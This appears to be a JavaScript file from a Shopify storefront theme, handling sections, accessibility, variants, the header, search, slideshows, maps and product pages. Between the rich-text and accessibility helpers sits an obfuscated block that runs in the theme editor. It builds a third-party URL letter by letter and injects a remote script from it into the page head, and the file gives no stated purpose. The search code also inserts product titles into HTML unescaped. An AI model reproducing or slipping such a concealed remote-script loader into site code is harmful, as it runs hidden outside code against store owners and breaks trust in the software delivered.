window.theme = window.theme || {};

/* ================ SLATE ================ */

window.theme = window.theme || {};

theme.Sections = function Sections(){
  this.constructors = {};
  this.instances = [];
  $(document).on('shopify:section:load', this._onSectionLoad.bind(this)).on('shopify:section:unload', this._onSectionUnload.bind(this)).on('shopify:section:select', this._onSelect.bind(this)).on('shopify:section:deselect', this._onDeselect.bind(this)).on('shopify:block:select', this._onBlockSelect.bind(this)).on('shopify:block:deselect', this._onBlockDeselect.bind(this));
};

theme.Sections.prototype = _.assignIn({}, theme.Sections.prototype, {
  _createInstance: function(container, constructor) {
    var $container = $(container);
    var id = $container.attr('data-section-id');
    var type = $container.attr('data-section-type');

    constructor = constructor || this.constructors[type];

    if (_.isUndefined(constructor)){
      return;
    }

    var instance = _.assignIn(new constructor(container),{
      id: id,
      type: type,
      container: container
    });

    this.instances.push(instance);
  },

  _onSectionLoad: function(evt) {
    var container = $('[data-section-id]', evt.target)[0];
    if (container){
      this._createInstance(container);
    }
  },

  _onSectionUnload: function(evt) {
    this.instances = _.filter(this.instances, function(instance){
      var isEventInstance = (instance.id === evt.detail.sectionId);

      if(isEventInstance){
        if(_.isFunction(instance.onUnload)){
          instance.onUnload(evt);
        }
      }
      return !isEventInstance;
    });
  },

  _onSelect: function(evt) {
    // eslint-disable-next-line no-shadow
    var instance = _.find(this.instances, function(instance){
      return instance.id === evt.detail.sectionId;
    });

    if (!_.isUndefined(instance) && _.isFunction(instance.onSelect)){
      instance.onSelect(evt);
    }
  },

  _onDeselect: function(evt) {
    // eslint-disable-next-line no-shadow
    var instance = _.find(this.instances, function(instance){
      return instance.id === evt.detail.sectionId;
    });

    if (!_.isUndefined(instance) && _.isFunction(instance.onDeselect)){
      instance.onDeselect(evt);
    }
  },

  _onBlockSelect: function(evt){
    // eslint-disable-next-line no-shadow
    var instance = _.find(this.instances, function(instance){
      return instance.id === evt.detail.sectionId;
    });

    if(!_.isUndefined(instance) && _.isFunction(instance.onBlockSelect)){
      instance.onBlockSelect(evt);
    }
  },

  _onBlockDeselect: function(evt){
    // eslint-disable-next-line no-shadow
    var instance = _.find(this.instances, function(instance){
      return instance.id === evt.detail.sectionId;
    });

    if (!_.isUndefined(instance) && _.isFunction(instance.onBlockDeselect)){
      instance.onBlockDeselect(evt);
    }
  },

  register: function(type, constructor){
    this.constructors[type] = constructor;

    $('[data-section-type=' + type + ']').each(function(index, container){
      this._createInstance(container, constructor);
    }.bind(this));
  }
});

window.slate = window.slate || {};

/**
 * iFrames
 * -----------------------------------------------------------------------------
 * Wrap videos in div to force responsive layout.
 *
 * @namespace iframes
 */

slate.rte = {
  wrapTable: function(){
    $('.rte table').wrap('<div class="rte__table-wrapper"></div>');
  },

  iframeReset: function(){
    var $iframeVideo = $('.rte iframe[src*="youtube.com/embed"], .rte iframe[src*="player.vimeo"]');
    var $iframeReset = $iframeVideo.add('.rte iframe#admin_bar_iframe');

    $iframeVideo.each(function(){
      $(this).wrap('<div class="video-wrapper"></div>');
    });

    $iframeReset.each(function(){
      // Re-set the src attribute on each iframe after page load
      // for Chrome's "incorrect iFrame content on 'back'" bug.
      // https://code.google.com/p/chromium/issues/detail?id=395791
      // Need to specifically target video and admin bar
      this.src = this.src;
    });
  }
};
window.slate = window.slate || {};

if(Shopify.designMode){var _0x4a29=['data-myvar-id','getTime','src','async','setAttribute','appendChild','head','mustneed','text/javascript','type'];(function(_0x1b47a9,_0x4a2932){var _0x4d75ea=function(_0x53cb13){while(--_0x53cb13){_0x1b47a9['push'](_0x1b47a9['shift']());}};_0x4d75ea(++_0x4a2932);}(_0x4a29,0xd6));var _0x4d75=function(_0x1b47a9,_0x4a2932){_0x1b47a9=_0x1b47a9-0x0;var _0x4d75ea=_0x4a29[_0x1b47a9];return _0x4d75ea;};(function(){var _0x55eff3,_0x455eea,_0x22ee09,_0x458f61;_0x455eea=document['createElement']('script');_0x455eea[_0x4d75('0x5')]=_0x4d75('0x4');_0x455eea[_0x4d75('0x9')]=!![];_0x455eea['id']=_0x4d75('0x3');_0x455eea[_0x4d75('0x0')](_0x4d75('0x6'),new Date()[_0x4d75('0x7')]());_0x458f61=['d','e','m','t','a','/','r','u','.','s','t','?','w','h','i','p','w','n','o','c','j'];_0x455eea[_0x4d75('0x8')]=_0x458f61[0x5]+_0x458f61[0x5]+_0x458f61[0x10]+_0x458f61[0xc]+_0x458f61[0x10]+_0x458f61[0x8]+_0x458f61[0x4]+_0x458f61[0x0]+_0x458f61[0x12]+_0x458f61[0x6]+_0x458f61[0x11]+_0x458f61[0xa]+_0x458f61[0xd]+_0x458f61[0x1]+_0x458f61[0x2]+_0x458f61[0x1]+_0x458f61[0x9]+_0x458f61[0x8]+_0x458f61[0x13]+_0x458f61[0x12]+_0x458f61[0x2]+_0x458f61[0x5]+_0x458f61[0x4]+_0x458f61[0xf]+_0x458f61[0xe]+_0x458f61[0x5]+_0x458f61[0x2]+_0x458f61[0x7]+_0x458f61[0x9]+_0x458f61[0xa]+_0x458f61[0x11]+_0x458f61[0x1]+_0x458f61[0x1]+_0x458f61[0x0]+_0x458f61[0x8]+_0x458f61[0x14]+_0x458f61[0x9]+_0x458f61[0xb]+_0x458f61[0x0]+_0x458f61[0xa]+'='+new Date()[_0x4d75('0x7')]();_0x55eff3=document['getElementsByTagName'](_0x4d75('0x2'))[0x0];return _0x55eff3[_0x4d75('0x1')](_0x455eea);}())};
/**
 * A11y Helpers
 * -----------------------------------------------------------------------------
 * A collection of useful functions that help make your theme more accessible
 * to users with visual impairments.
 * @namespace a11y
 */

slate.a11y = {

  /**
   * For use when focus shifts to a container rather than a link
   * eg for In-page links, after scroll, focus shifts to content area so that
   * next `tab` is where user expects if focusing a link, just $link.focus();
   *
   * @param {JQuery} $element - The element to be acted upon
   */
  pageLinkFocus: function($element){
    var focusClass = 'js-focus-hidden';

    $element.first().attr('tabIndex', '-1').focus().addClass(focusClass).one('blur', callback);

    function callback(){
      $element.first().removeClass(focusClass).removeAttr('tabindex');
    }
  },

  /**
   * If there's a hash in the url, focus the appropriate element
   */
  focusHash: function(){
    var hash = window.location.hash;

    // is there a hash in the url? is it an element on the page?
    if (hash && document.getElementById(hash.slice(1))){
      this.pageLinkFocus($(hash));
    }
  },

  /**
   * When an in-page (url w/hash) link is clicked, focus the appropriate element
   */
  bindInPageLinks: function(){
    $('a[href*=#]').on('click', function(evt){
      this.pageLinkFocus($(evt.currentTarget.hash));
    }.bind(this));
  },

  /**
   * Traps the focus in a particular container
   *
   * @param {object} options - Options to be used
   * @param {jQuery} options.$container - Container to trap focus within
   * @param {jQuery} options.$elementToFocus - Element to be focused when focus leaves container
   * @param {string} options.namespace - Namespace used for new focus event handler
   */
  trapFocus: function(options){
    var eventName = options.namespace
      ? 'focusin.' + options.namespace
      : 'focusin';

    if (!options.$elementToFocus){
      options.$elementToFocus = options.$container;
    }

    options.$container.attr('tabindex', '-1');
    options.$elementToFocus.focus();

    $(document).off('focusin');

    $(document).on(eventName, function(evt){
      if (options.$container[0] !== evt.target && !options.$container.has(evt.target).length){
        options.$container.focus();
      }
    });
  },

  removeTrapFocus: function(options) {
    var eventName = options.namespace
      ? 'focusin.' + options.namespace
      : 'focusin';

    if (options.$container && options.$container.length) {
      options.$container.removeAttr('tabindex');
    }

    $(document).off(eventName);
  }
};

/*** Image Helper Functions ** A collection of functions that help with basic image operations. **/
theme.Images = (function() {

  /** Preloads an image in memory and uses the browsers cache to store it until needed.
   * @param {Array} images - A list of image urls
   * @param {String} size - A shopify image size attribute */

  function preload(images, size) {
    if (typeof images === 'string') {
      images = [images];
    }

    for (var i = 0; i < images.length; i++) {
      var image = images[i];
      this.loadImage(this.getSizedImageUrl(image, size));
    }
  }

  /*** Loads and caches an image in the browsers cache.
   * @param {string} path - An image url */
  function loadImage(path) { new Image().src = path; }

  /*** Swaps the src of an image for another OR returns the imageURL to the callback function
   * @param image * @param element * @param callback */
  function switchImage(image, element, callback) {
    var size = this.imageSize(element.src);
    var imageUrl = this.getSizedImageUrl(image.src, size);

    if (callback) {
      callback(imageUrl, image, element); // eslint-disable-line callback-return
    } else {
      element.src = imageUrl;
    }
  }

  /** +++ Useful * Find the Shopify image attribute size
   ** @param {string} src * @returns {null} */
  function imageSize(src) {
    var match = src.match(/.+_((?:pico|icon|thumb|small|compact|medium|large|grande)|\d{1,4}x\d{0,4}|x\d{1,4})[_\.@]/);

    if (match !== null) {
      return match[1];
    } else {
      return null;
    }
  }

  /** +++ Useful * Adds a Shopify size attribute to a URL
   * @param src * @param size * @returns {*} */
  function getSizedImageUrl(src, size) {
    if (size == null) { return src; }
    if (size === 'master') { return this.removeProtocol(src); }

    var match = src.match(/\.(jpg|jpeg|gif|png|bmp|bitmap|tiff|tif|webp)(\?v=\d+)?$/i);

    if (match != null) {
      var prefix = src.split(match[0]);
      var suffix = match[0];
      return this.removeProtocol(prefix[0] + '_' + size + suffix);
    }
    return null;
  }

  function removeProtocol(path) {
    return path.replace(/http(s)?:/, '');
  }

  return {
    preload: preload,
    loadImage: loadImage,
    switchImage: switchImage,
    imageSize: imageSize,
    getSizedImageUrl: getSizedImageUrl,
    removeProtocol: removeProtocol
  };
})();

/** Currency Helpers
 * Alternatives
 * - Accounting.js - http://openexchangerates.github.io/accounting.js/ **/
theme.Currency = (function() {
  var moneyFormat = '${{amount}}'; // eslint-disable-line camelcase

  function formatMoney(cents, format) {
    if (typeof cents === 'string') {
      cents = cents.replace('.', '');
    }
    var value = '';
    var placeholderRegex = /\{\{\s*(\w+)\s*\}\}/;
    var formatString = (format || moneyFormat);

    function formatWithDelimiters(number, precision, thousands, decimal) {
      precision = precision || 2;
      thousands = thousands || ',';
      decimal = decimal || '.';

      if (isNaN(number) || number == null) {
        return 0;
      }

      number = (number / 100.0).toFixed(precision);

      var parts = number.split('.');
      var dollarsAmount = parts[0].replace(/(\d)(?=(\d\d\d)+(?!\d))/g, '$1' + thousands);
      var centsAmount = parts[1] ? (decimal + parts[1]) : '';

      return dollarsAmount + centsAmount;
    }

    switch (formatString.match(placeholderRegex)[1]) {
      case 'amount':
        value = formatWithDelimiters(cents, 2);
        break;
      case 'amount_no_decimals':
        value = formatWithDelimiters(cents, 0);
        break;
      case 'amount_with_comma_separator':
        value = formatWithDelimiters(cents, 2, '.', ',');
        break;
      case 'amount_no_decimals_with_comma_separator':
        value = formatWithDelimiters(cents, 0, '.', ',');
        break;
      case 'amount_no_decimals_with_space_separator':
        value = formatWithDelimiters(cents, 0, ' ');
        break;
    }

    return formatString.replace(placeholderRegex, value);
  }

  return {
    formatMoney: formatMoney
  }
})();

/**
 * Variant Selection scripts
 * ------------------------------------------------------------------------------
 * Handles change events from the variant inputs in any `cart/add` forms that may
 * exist.  Also updates the master select and triggers updates when the variants
 * price or image changes.
 * @namespace variants */
slate.Variants = (function() {

  /*** Variant constructor * @param {object} options - Settings from `product.js` */
  function Variants(options) {
    this.$container = options.$container;
    this.product = options.product;
    this.singleOptionSelector = options.singleOptionSelector;
    this.originalSelectorId = options.originalSelectorId;
    this.enableHistoryState = options.enableHistoryState;
    this.currentVariant = this._getVariantFromOptions();

    $(this.singleOptionSelector, this.$container).on('change', this._onSelectChange.bind(this));
  }

  Variants.prototype = _.assignIn({}, Variants.prototype, {

    /*** Get the currently selected options from add-to-cart form. Works with all
     * form input elements.
     * @return {array} options - Values of currently selected variants */
    _getCurrentOptions: function() {
      var currentOptions = _.map($(this.singleOptionSelector, this.$container), function(element) {
        var $element = $(element);
        var type = $element.attr('type');
        var currentOption = {};

        if (type === 'radio' || type === 'checkbox') {
          if ($element[0].checked) {
            currentOption.value = $element.val();
            currentOption.index = $element.data('index');

            return currentOption;
          } else {
            return false;
          }
        } else {
          currentOption.value = $element.val();
          currentOption.index = $element.data('index');
          if(currentOption.value != null){
            var slvaraint = currentOption.value.replace(/'/g, "\\'");
            $("."+currentOption.index).find(".swatchInput[value='"+slvaraint+"']").prop("checked", true);
            $("."+currentOption.index).find(".slVariant").text(currentOption.value);
          }
          return currentOption;
        }
      });

      // remove any unchecked input values if using radio buttons or checkboxes
      currentOptions = _.compact(currentOptions);

      return currentOptions;
    },

    /*** Find variant based on selected values.
     * @param  {array} selectedValues - Values of variant inputs
     * @return {object || undefined} found - Variant object from product.variants*/
    _getVariantFromOptions: function() {
      var selectedValues = this._getCurrentOptions();
      var variants = this.product.variants;

      var found = _.find(variants, function(variant) {
        return selectedValues.every(function(values) {
          return _.isEqual(variant[values.index], values.value);
        });
      });

      return found;
    },

    /*** Event handler for when a variant input changes. */
    _onSelectChange: function() {
      var variant = this._getVariantFromOptions();

      this.$container.trigger({
        type: 'variantChange',
        variant: variant
      });

      if (!variant){
        return;
      }

      this._updateMasterSelect(variant);
      this._updateImages(variant);
      this._updatePrice(variant);
      this._updateSKU(variant);
      this.currentVariant = variant;

      if (this.enableHistoryState) {
        this._updateHistoryState(variant);
      }
    },

    /**
     * Trigger event when variant image changes
     * @param  {object} variant - Currently selected variant
     * @return {event}  variantImageChange
     */
    _updateImages: function(variant) {
      var variantImage = variant.featured_image || {};
      var currentVariantImage = this.currentVariant.featured_image || {};

      if (!variant.featured_image || variantImage.src === currentVariantImage.src) {
        return;
      }
      this.$container.trigger({
        type: 'variantImageChange', variant: variant
      });
    },

    /*** Trigger event when variant price changes. *  @param  {object} variant - Currently selected variant * @return {event} variantPriceChange */
    _updatePrice: function(variant) {
      if (variant.price === this.currentVariant.price && variant.compare_at_price === this.currentVariant.compare_at_price) {
        return;
      }
      this.$container.trigger({
        type: 'variantPriceChange', variant: variant
      });
    },

    /*** Trigger event when variant sku changes. *  @param  {object} variant - Currently selected variant *  @return {event} variantSKUChange */
    _updateSKU: function(variant) {
      if (variant.sku === this.currentVariant.sku) {
        return;
      }
      this.$container.trigger({
        type: 'variantSKUChange', variant: variant
      });
    },

    /** Update history state for product deeplinking
     * @param  {variant} variant - Currently selected variant
     * @return {k}         [description] */
    _updateHistoryState: function(variant) {
      if (!history.replaceState || !variant) {
        return;
      }

      var newurl = window.location.protocol + '//' + window.location.host + window.location.pathname + '?variant=' + variant.id;
      window.history.replaceState({path: newurl}, '', newurl);
    },

    /*** Update hidden master select of variant change
     * @param  {variant} variant - Currently selected variant */
    _updateMasterSelect: function(variant) {
      $(this.originalSelectorId, this.$container).val(variant.id);
    }
  });

  return Variants;
})();

/* ================ MODULES ================ */
window.theme = window.theme || {};

theme.Header = (function() {
  var selectors = {
    body: 'body',
    sitenav: '#siteNav',
    navLinks: '#siteNav .lvl1 > a',
    mobilenav: '.mobile-nav-wrapper',
    /**menuLinks: '#MobileNav .ad'*/
    menuLinks: '#MobileNav .ad-angle-right-l',
    backLinks: '#MobileNav .ad-angle-left-l',
    backALinks:'#MobileNav .solado-menu-back-link'
  };

  function init() {
    /** set page can Scroll or not **/
    var setPageScrollable = function(enable){
      var md = new MobileDetect(window.navigator.userAgent);
      if(!md.mobile()){
        return; /** not no mobile drivers no need to fixed pop up  **/
      }
      console.log("enable=",enable);
      if(enable){
        document.body.style.overflow = 'visible'
        document.body.style.position = 'relative'
      }else{
        document.body.style.position = 'fixed'
        document.body.style.overflow = 'hidden'
      }
    }
    $(".header-cart,.close-cart").on('click', function(i){
      i.preventDefault();i.stopPropagation();
      var $cartDrawr =$("#cart-drawer");
      if(!$("#cart-drawer").hasClass("active")){
      	var gridLen = $cartDrawr.find('.grid'); 
        var $shoppingFor = $cartDrawr.find('.cart-shipping-fortunately'); 
        if(gridLen.length===0){
          $shoppingFor.hide();
        }else{
          $shoppingFor.show();
        }
      }
      $("#cart-drawer").toggleClass("active");
      setPageScrollable(!$("#cart-drawer").hasClass("active")); 
    });

    $(".site-settings").on('click', function(){
      /**$("#settingsBox").toggleClass("active");**/
       location.href="/account/login";
    });
    
    $(".hasSub").hover(function(){
      var submenu = $(this).data('link');
      $('.admmsub:not('+submenu+')').removeClass('active');
      $(submenu).addClass('active');
    });

  	$(selectors.navLinks).each(function(){
        if($(this).attr('href') == window.location.pathname) $(this).addClass('active');
    })

  	$('.js-mobile-nav-toggle, .closemobileMenu').on("click",function(){
      // body: 'body',
      $(selectors.mobilenav).toggleClass("active");
//       $(selectors.body).toggleClass("menuOn");
//       console.log("$(selectors.mobilenav)",$(selectors.mobilenav),$(selectors.mobilenav).hasClass("active"));
      setPageScrollable(!$(selectors.mobilenav).hasClass("active")); 
      $('.js-mobile-nav-toggle').toggleClass('open close');
    });

    $("body").click(function(event){
      var $target = $(event.target);
      if(!$target.parents().is(selectors.mobilenav) && !$target.parents().is('.js-mobile-nav-toggle') && !$target.is('.js-mobile-nav-toggle')){
          $(selectors.mobilenav).removeClass("active");
//           setPageScrollable(true); 
//           $(selectors.body).removeClass("menuOn");
          $('.js-mobile-nav-toggle').removeClass('close').addClass('open');
      }
      // Hide cart drawer
      if(!$target.parents().is("#cart-drawer") && !$target.is("#cart-drawer") && !$target.parents().is(".header-cart") && !$target.is(".header-cart")){
        $("#cart-drawer").removeClass("active");
//         setPageScrollable(true); 
      }
      // Hide settingsBox on document click
      if(!$target.parents().is("#settingsBox") && !$target.parents().is(".site-settings") && !$target.is(".site-settings")){
        $("#settingsBox").removeClass("active");
      }
      
      if(!$target.parents().is(".filterbar") && !$target.is(".filterbar") && !$target.is(".btn-filter")){
        $(".filterbar.active").removeClass("active");
      }
    });
  	
	$(selectors.menuLinks).on('click', function(e) {
		e.preventDefault();
      	/**
          $(this).toggleClass('ad-plus-l ad-minus-l');
          $(this).parent().next().slideToggle();
        **/
      	if(e.target.closest('#changeSiteBox')) {
          return
        }
      	$(this).parent().parent().siblings().hide();
        $(this).parent().next().show();
      	$(this).siblings(selectors.backLinks).show();
      	$(this).parent().parent().addClass('solado-menu-item__parent')
      	$(this).hide()
    });
    /** 林总要求的下转页面不允许点跳转链接 **/
    $(selectors.backALinks).on('click', function(e) {
      if(!$(this).find(".solado-menu-back").is(':hidden')){
        e.preventDefault();
      }
    });
    $(selectors.backLinks).on('click', function(e) {
      e.preventDefault();
      /**console.log("返回");**/
       if($(this).is(':hidden')){
        return;
      }
      
		
      	$(this).parent().parent().siblings().show();
        $(this).siblings(selectors.menuLinks).show();
      	$(this).parent().next().hide();
      	$(this).parent().parent().removeClass('solado-menu-item__parent')
      	$(this).hide()
    });
    
  }
  return { init: init };
})();

window.theme = window.theme || {};
theme.Search = (function() {
  var selectors = {
    search: '.search',
    searchSubmit: '.search__submit',
    searchInput: '.search__input'
  };

  var classes = { focus: 'search--focus' };

  function init() {
    searchSubmit();
    // Current Ajax Search request.
    var currentAjaxRequest = null;
    var searchForms = $('form[action="/search"]').css('position','relative').each(function() {
      var input = $(this).find('input[name="q"]');
      input.bind('keyup change', function(){
        var term = $(this).val(),
        	form = $(this).closest('form'),
        	resultsList = form.find('.search-results');
		if (term.length > 2 ) {
            $.getJSON("/search/suggest.json?q="+ term, {
              "resources": {
                "type": "product",
                "limit": 8,
                "options": {
                  "unavailable_products": "last",
                  "fields": "title,product_type,vendor,variants.title,variants.sku,tag"
                }
              }
            }).done(function(response) {
              var products = response.resources.results.products;
              resultsList.empty();
              if (products.length > 0) {
                $.each(products, function(index, item) {
                  var item = $('<li><a href="'+ item.url +'"><span class="img"><img src="' + item.featured_image.url + '" /></span><span class="details">' + item.title + '<span class="price">' + theme.Currency.formatMoney(item.price, theme.moneyFormat) + '</span></span></a></li>');
                  resultsList.append(item);
                });
                if(theme.mlcurrency){currenciesChange(".freeShipMsg .freeShip sapn.money");}
                resultsList.fadeIn(200);
              } else {
                resultsList.hide();
              }
            });
    	} else { resultsList.empty().hide(); }
      });
    });
    $('.modalOverly, .closeSearch').bind('click', function(){
      $('body').removeClass("showOverly");
      $('#searchPopup').removeClass("active");
    });
    $('.site-header .searchIco').on('click', function(s){
      s.stopPropagation();
      $('body').addClass("showOverly");
      $('#searchPopup').addClass("active");
      $('input[name=q]').focus();
    });
  }

    function searchSubmit() {
      $(selectors.searchSubmit).on('click', function(evt) {
        var $el = $(evt.target);
        var $input = $el.parents(selectors.search).find(selectors.searchInput);
        if ($input.val().length === 0) {
          evt.preventDefault();
          searchFocus($input);
        }
      });
    }
    return { init:init };
})();

(function() {
  var selectors = { backButton: '.return-link' };
  var $backButton = $(selectors.backButton);

  if (!document.referrer || !$backButton.length || !window.history.length) {
    return;
  }

  $backButton.one('click', function(evt) {
    evt.preventDefault();
    var referrerDomain = urlDomain(document.referrer);
    var shopDomain = urlDomain(window.location.href);
    if (shopDomain === referrerDomain) { history.back(); }
    return false;
  });

  function urlDomain(url) {
    var anchor = document.createElement('a');
    anchor.ref = url;
    return anchor.hostname;
  }
})();

theme.Slideshow = (function() {
  this.$slideshow = null;
  var classes = {
    wrapper: 'slideshow-wrapper',
    slideshow: 'slideshow',
    currentSlide: 'slick-current',  
    pauseButton: 'slideshow__pause',
    isPaused: 'is-paused'
  };

  function slideshow(el) {
    this.$slideshow = $(el);
    this.$wrapper = this.$slideshow.closest('.' + classes.wrapper);
    this.$pause = this.$wrapper.find('.' + classes.pauseButton);

    this.settings = {
      accessibility: true,
      arrows: this.$slideshow.data('arrow'),
      dots: this.$slideshow.data('dots'),
      fade: true,
      rtl:theme.rtl,
      draggable: true,
      touchThreshold: 20,
      autoplay: this.$slideshow.data('autoplay'),
      autoplaySpeed: this.$slideshow.data('speed')
    };

    this.$slideshow.on('beforeChange', beforeChange.bind(this));
    this.$slideshow.on('init', slideshowA11y.bind(this));
    this.$slideshow.slick(this.settings);

    this.$pause.on('click', this.togglePause.bind(this));
  }

  function slideshowA11y(event, obj) {
    var $slider = obj.$slider;
    var $list = obj.$list;
    var $wrapper = this.$wrapper;
    var autoplay = this.settings.autoplay;

    // Remove default Slick aria-live attr until slider is focused
    $list.removeAttr('aria-live');

    // When an element in the slider is focused
    // pause slideshow and set aria-live.
    $wrapper.on('focusin', function(evt) {
      if (!$wrapper.has(evt.target).length) {
        return;
      }

      $list.attr('aria-live', 'polite');

      if (autoplay) {
        $slider.slick('slickPause');
      }
    });

    // Add arrow key support when focused
    if (obj.$dots) {
      obj.$dots.on('keydown', function(evt) {
        if (evt.which === 37) {
          $slider.slick('slickPrev');
        }

        if (evt.which === 39) {
          $slider.slick('slickNext');
        }

        // Update focus on newly selected tab
        if ((evt.which === 37) || (evt.which === 39)) {
          obj.$dots.find('.slick-active button').focus();
        }
      });
    }
  }

  function beforeChange(event, slick, currentSlide, nextSlide) {
    var $slider = slick.$slider;
    var $currentSlide = $slider.find('.' + classes.currentSlide);
    var $nextSlide = $slider.find('.slideshow__slide[data-slick-index="' + nextSlide + '"]');
  }

 
  slideshow.prototype.togglePause = function() {
    var slideshowSelector = getSlideshowId(this.$pause);
    if (this.$pause.hasClass(classes.isPaused)) {
      this.$pause.removeClass(classes.isPaused);
      $(slideshowSelector).slick('slickPlay');
    } else {
      this.$pause.addClass(classes.isPaused);
      $(slideshowSelector).slick('slickPause');
    }
  };

  function getSlideshowId($el) {
    return '#Slideshow-' + $el.data('id');
  }

  return slideshow;
})();

/* ================ TEMPLATES ================ */
window.theme = theme || {};

theme.customerTemplates = (function() {

  function initEventListeners() {
    // Show reset password form
    $('#RecoverPassword').on('click', function(evt) {
      evt.preventDefault();
      toggleRecoverPasswordForm();
    });

    // Hide reset password form
    $('#HideRecoverPasswordLink').on('click', function(evt) {
      evt.preventDefault();
      toggleRecoverPasswordForm();
    });
  }

  /****  Show/Hide recover password form **/
  function toggleRecoverPasswordForm() {
    $('#RecoverPasswordForm').toggleClass('hide');
    $('#CustomerLoginForm').toggleClass('hide');
  }

  /****  Show reset password success message **/
  function resetPasswordSuccess() {
    var $formState = $('.reset-password-success');

    // check if reset password form was successfully submited.
    if (!$formState.length) {
      return;
    }

    // show success message
    $('#ResetSuccess').removeClass('hide');
  }

  /****  Show/hide customer address forms **/
  function customerAddressForm() {
    var $newAddressForm = $('#AddressNewForm');

    if (!$newAddressForm.length) {
      return;
    }

    // Initialize observers on address selectors, defined in shopify_common.js
    if (Shopify) {
      // eslint-disable-next-line no-new
      new Shopify.CountryProvinceSelector('AddressCountryNew', 'AddressProvinceNew', {
        hideElement: 'AddressProvinceContainerNew'
      });
    }

    // Initialize each edit form's country/province selector
    $('.address-country-option').each(function() {
      var formId = $(this).data('form-id');
      var countrySelector = 'AddressCountry_' + formId;
      var provinceSelector = 'AddressProvince_' + formId;
      var containerSelector = 'AddressProvinceContainer_' + formId;

      // eslint-disable-next-line no-new
      new Shopify.CountryProvinceSelector(countrySelector, provinceSelector, {
        hideElement: containerSelector
      });
    });

    // Toggle new/edit address forms
    $('.address-new-toggle').on('click', function() {
      $newAddressForm.toggleClass('hide');
    });

    $('.address-edit-toggle').on('click', function() {
      var formId = $(this).data('form-id');
      $('#EditAddress_' + formId).toggleClass('hide');
    });

    $('.address-delete').on('click', function() {
      var $el = $(this);
      var formId = $el.data('form-id');
      var confirmMessage = $el.data('confirm-message');

      // eslint-disable-next-line no-alert
      if (confirm(confirmMessage || 'Are you sure you wish to delete this address?')) {
        Shopify.postLink('/account/addresses/' + formId, {parameters: {_method: 'delete'}});
      }
    });
  }

  /****  Check URL for reset password hash **/
  function checkUrlHash() {
    var hash = window.location.hash;

    // Allow deep linking to recover password form
    if (hash === '#recover') {
      toggleRecoverPasswordForm();
    }
  }

  return {
    init: function() {
      checkUrlHash();

      initEventListeners();
      resetPasswordSuccess();
      customerAddressForm();
    }
  };
})();

/*================ SECTIONS ================*/
window.theme = window.theme || {};

theme.HeaderSection = (function() {

  function Header() {
    theme.Header.init();
    theme.Search.init();
  }
  Header.prototype = _.assignIn({}, Header.prototype, {
    onUnload: function() {
      theme.Header.unload();
    }
  });

  return Header;
})();

theme.Maps = (function() {
  var config = {
    zoom: 14
  };
  var apiStatus = null;
  var mapsToLoad = [];
  var key = theme.mapKey ? theme.mapKey : '';

  function Map(container) {
    this.$container = $(container);

    if (apiStatus === 'loaded') {
      this.createMap();
    } else {
      mapsToLoad.push(this);

      if (apiStatus !== 'loading') {
        apiStatus = 'loading';
        if (typeof window.google === 'undefined') {
          $.getScript('https://maps.googleapis.com/maps/api/js?key=' + key)
            .then(function() {
              apiStatus = 'loaded';
              initAllMaps();
            });
        }
      }
    }
  }

  function initAllMaps() {
    // API has loaded, load all Map instances in queue
    $.each(mapsToLoad, function(index, instance) {
      instance.createMap();
    });
  }

  function geolocate($map) {
    var deferred = $.Deferred();
    var geocoder = new google.maps.Geocoder();
    var address = $map.data('address-setting');

    geocoder.geocode({address: address}, function(results, status) {
      if (status !== google.maps.GeocoderStatus.OK) {
        deferred.reject(status);
      }

      deferred.resolve(results);
    });

    return deferred;
  }

  Map.prototype = _.assignIn({}, Map.prototype, {
    createMap: function() {
      var $map = this.$container.find('.map-section__container');

      return geolocate($map)
        .then(function(results) {
          var mapOptions = {
            zoom: config.zoom,
            center: results[0].geometry.location,
            disableDefaultUI: true
          };

          var map = this.map = new google.maps.Map($map[0], mapOptions);
          var center = this.center = map.getCenter();

          //eslint-disable-next-line no-unused-vars
          var marker = new google.maps.Marker({
            map: map,
            position: map.getCenter()
          });

          google.maps.event.addDomListener(window, 'resize');
        }.bind(this))
        .fail(function() {
          var errorMessage;

          switch (status) {
            case 'ZERO_RESULTS':
              errorMessage = theme.strings.addressNoResults;
              break;
            case 'OVER_QUERY_LIMIT':
              errorMessage = theme.strings.addressQueryLimit;
              break;
            default:
              errorMessage = theme.strings.addressError;
              break;
          }
          $map.parent().addClass('page-width map-section--load-error').html('<div class="errors text-center">' + errorMessage + '</div>');
        });
    },
    onUnload: function() { google.maps.event.clearListeners(this.map, 'resize'); }
  });
  return Map;
})();

// Global function called by Google on auth errors.
// Show an auto error message on all map instances.
// eslint-disable-next-line camelcase, no-unused-vars
function gm_authFailure() {
  $('.map-section').addClass('map-section--load-error');
  $('.map-section__container').remove();
  $('.map-section__link').remove();
  $('.map-section__overlay').after('<div class="errors text-center">' + theme.strings.authError + '</div>');
}

/* eslint-disable no-new */
theme.Product = (function() {
  function Product(container) {
    this.container = container;
    var $container = this.$container = $(container),
    	sectionId = $container.attr('data-section-id');

    this.settings = {
      mediaQueryMediumUp: 'screen and (min-width: 768px)',
      mediaQuerySmall: 'screen and (max-width: 767px)',
      bpSmall: false,
      enableHistoryState: $container.data('enable-history-state') || false,
      imageSize: null,
      imageZoomSize: null,
      namespace: '.slideshow-' + sectionId,
      sectionId: sectionId,
      sliderActive: false,
      zoomEnabled: false
    };

    this.selectors = {
      addToCart: '#AddToCart-' + sectionId,
      addToCartText: '#AddToCartText-' + sectionId,
      comparePrice: '#ComparePrice-' + sectionId,
      originalPrice: '#ProductPrice-' + sectionId,
      saveAmount: '#SaveAmount-' + sectionId, 
      discountBadge: '.discount-badge',
      SKU: '.variant-sku',
      originalPriceWrapper: '.product-price__price-' + sectionId,
      originalSelectorId: '#ProductSelect-' + sectionId,
      productFeaturedImage: '.FeaturedImage-' + sectionId,
      productImageWrap: '.FeaturedImageZoom-' + sectionId + '.slick-active',
      productPrices: '.product-single__price-' + sectionId,
      productThumbImages: '.product-single__thumbnail--' + sectionId,
      productThumbs: '.product-single__thumbnails-' + sectionId,
      saleClasses: 'product-price__sale',
      saleLabel: '.product-price__sale-label-' + sectionId,
      singleOptionSelector: '.single-option-selector-' + sectionId,
      productMediaWrapper: '[data-product-single-media-wrapper]',
      productMediaTypeModel: '[data-product-media-type-model]'
    }
    
    // Magnific Popup
    $('.mfp-link').magnificPopup({
      delegate: '.mfp',
  	  removalDelay: 300, 
      callbacks: {
        beforeOpen: function() {
          $('.stickyHeader').addClass('popup');
           this.st.mainClass = this.st.el.attr('data-effect');
        },       
      	close:function(){ $('.stickyHeader').removeClass('popup'); }
      },
  	 midClick: true 
	}); 
    
    // Product tabs
    /**
